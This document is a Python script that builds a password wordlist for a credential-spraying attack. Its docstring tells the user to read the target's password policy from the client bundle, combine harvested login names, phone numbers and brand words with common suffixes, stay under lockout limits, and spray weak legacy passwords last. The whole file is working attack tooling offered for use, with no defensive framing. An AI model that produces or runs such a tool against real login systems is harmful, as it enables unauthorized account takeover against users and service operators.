#!/usr/bin/env python3
"""Generate a policy-compliant password candidate list for a credential spray.

Usage:
  ./gen_policy_wordlist.py --min-len 8 --charset alnum \\
      --identifier admin --identifier daili1 --mobile <PHONE-REDACTED> \\
      --word opensms --out wl_policy.txt

Why: read the target's OWN password policy first (it is usually sitting in the
client bundle's config/profile keys), then generate candidates that satisfy it.
When the policy says "letters and digits only", every `@`/`!` candidate is a
mathematically impossible miss and wastes attempts the lockout/alias budget
cannot spare. Keep a short policy-violating tranche (`123456` and friends) and
spray it LAST: rows created before the policy existed do not obey it.

--charset alnum  -> letters+digits only, and (unless --allow-simple) requires
                    upper+lower+digit, matching the usual "8+, mixed, no
                    symbols" rule.
--charset any    -> also emits @ _ . ! separators, for policies without a
                    charset restriction.
"""

import argparse

TAILS = [
    "1", "12", "123", "1234", "12345", "123456", "1234567", "12345678",
    "111", "1111", "888", "8888", "666", "6666", "000", "0000",
    "2024", "2025", "2026", "2027", "321", "3210", "5201314",
]
SEPS = ["", "@", "_", ".", "!"]


def cap(s: str) -> str:
    return s[:1].upper() + s[1:] if s else s


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--identifier", action="append", default=[],
                    help="harvested login name (repeatable)")
    ap.add_argument("--mobile", action="append", default=[],
                    help="harvested mobile/phone number (repeatable)")
    ap.add_argument("--word", action="append", default=[],
                    help="brand / product / site word (repeatable)")
    ap.add_argument("--min-len", type=int, default=8)
    ap.add_argument("--charset", choices=["alnum", "any"], default="alnum")
    ap.add_argument("--allow-simple", action="store_true",
                    help="skip the upper+lower+digit requirement")
    ap.add_argument("--out", default="wl_policy.txt")
    a = ap.parse_args()

    seps = [""] if a.charset == "alnum" else SEPS
    bases = []
    for w in list(a.word) + list(a.identifier):
        bases += [w, cap(w), w.lower(), w.upper()]

    out = set()
    for b in bases:
        for s in seps:
            for t in TAILS:
                out.add(f"{b}{s}{t}")

    for m in a.mobile:
        for s in seps:
            out.add(f"Aa{s}{m}")
            out.add(f"Admin{s}{m}")
            out.add(f"{m}{s}Aa")
        for cut in range(4, len(m) + 1):
            out.add(f"Aa{m[-cut:]}")
            out.add(f"Admin{m[-cut:]}")

    words = {w for w in out if len(w) >= a.min_len}
    if a.charset == "alnum":
        words = {w for w in words if w.isalnum()}
    if not a.allow_simple:
        words = {w for w in words
                 if any(c.isupper() for c in w)
                 and any(c.islower() for c in w)
                 and any(c.isdigit() for c in w)}

    ordered = sorted(words)
    with open(a.out, "w") as fh:
        fh.write("\n".join(ordered) + "\n")
    print(f"{len(ordered)} candidates -> {a.out} "
          f"(min_len={a.min_len}, charset={a.charset}, allow_simple={a.allow_simple})")


if __name__ == "__main__":
    main()
